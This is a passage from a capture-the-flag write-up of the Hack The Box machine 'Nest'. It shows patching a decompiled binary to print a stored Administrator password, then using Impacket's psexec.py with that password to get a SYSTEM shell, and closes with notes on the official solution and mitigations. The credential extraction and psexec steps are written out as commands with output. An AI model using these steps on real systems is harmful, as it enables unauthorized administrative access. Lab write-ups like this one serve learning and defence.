So I simply delete the check and change one of the WriteLine statements to write ldap.Password

```
remove:

ElseIf Not File.Exists("HqkDbImport.exe") Then
		Console.WriteLine("Please ensure the optional database import module is installed")

and change:


Dim ldap As Ldap = New Ldap()
ldap.Username = ldapSearchSettings.Username
ldap.Password = ldapSearchSettings.Password
ldap.Domain = ldapSearchSettings.Domain
Console.WriteLine(ldap.Password)
```


```
PS F:\dnSpy-net-win64\Nest> .\HqkLdap_nodb.exe .\Ldap.conf
XtH4nkS4Pl4y1nGX
Unexpected error: The specified domain does not exist or cannot be contacted.
PS F:\dnSpy-net-win64\Nest>
```

And then finally we can use psexec to gain root:

```
root@kali:/home/kali/htb/Nest/AD Integration Module# psexec.py WORKGROUP/Administrator:XtH4nkS4Pl4y1nGX@10.129.114.52
Impacket v0.9.22.dev1+20200819.170651.b5fa089b - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.129.114.52.....
[*] Found writable share ADMIN$
[*] Uploading file fBjAqLkR.exe
[*] Opening SVCManager on 10.129.114.52.....
[*] Creating service QMuv on 10.129.114.52.....
[*] Starting service QMuv.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
```


Wow, what a box. I think writing down findings, and constantly checking back on them is the time-saving key here.

I think I will revisit the reverse engineering challenges here more thoroughly and properly understand them another day.


## Comparing myself to the official writeup

They enumerate the smbshare with smbmap and find the read only access on Data and Users.

they then use `smbmap -H 10.10.10.178 -R Data --no-banner` to enumerate the information on the Data share and find the email txt.

Thats a good smbmap trick I'm going to use in the future.

They get the creds and enter the secure$ share.

They find c.smith creds and the hint that we may have access to \secure$\IT\Carl

They port the .NET code to C# and compile it in linux with mono.

After getting the password they find the alternate data stream on the debug mode password file.

They download the binary and use DiE to reveal that it is a Visual Basic .NET binary, and then run it through dnSpy.

They modify the binary and get the password. And then run psexec to gain access.



## How to stop this exploit:

It is clear that the maker of the server had security in mind, as they obfuscated passwords throughout. But one thing safer than obfuscation is to not leave the passwords there at all.

The open smbshare is the vulnerability to begin with. There is no reason to give an anonymous user read access to any of these files. And sending usernames and passwords in plaintext over mail is bad practice. And saving this mail as a file is even worse.

And we also have the nested permissions, where we have read access to a directory, and then permission denied, and then read access. Which is just overlooked privileges.

The rest is just reverse engineering mostly. While the project is a WIP, real credentials should not be used. Especially not stored anywhere.
